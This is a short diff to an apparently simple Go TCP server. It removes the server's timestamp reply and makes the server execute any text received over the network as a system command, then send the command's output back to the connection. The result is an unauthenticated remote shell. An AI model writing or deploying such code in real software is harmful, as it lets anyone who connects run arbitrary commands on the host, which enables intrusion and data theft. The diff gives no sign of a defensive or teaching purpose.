@@ -7,7 +7,7 @@ import (
         "net"
         "os"
         "strings"
-		"time"
+		//"time"
 		"os/exec"
 		"log"
 		
@@ -45,7 +45,7 @@ func main() {
                         return
 				}
 				
-				cmd := exec.Command(string(netData),"-lah")
+				cmd := exec.Command(strings.TrimSpace(string(netData)))
 				out, err := cmd.CombinedOutput()
 				if err != nil {
 					log.Fatalf("cmd.Run() failed with %s\n", err)
@@ -53,9 +53,9 @@ func main() {
 				fmt.Printf("combined out:\n%s\n", string(out))
 
                 fmt.Print("-> ", string(netData))
-                t := time.Now()
-                myTime := t.Format(time.RFC3339) + "\n"
-                connection.Write([]byte(myTime))
+                // t := time.Now()
+                // myTime := t.Format(time.RFC3339) + "\n"
+                connection.Write([]byte(string(out)))
 		}
 		
 		
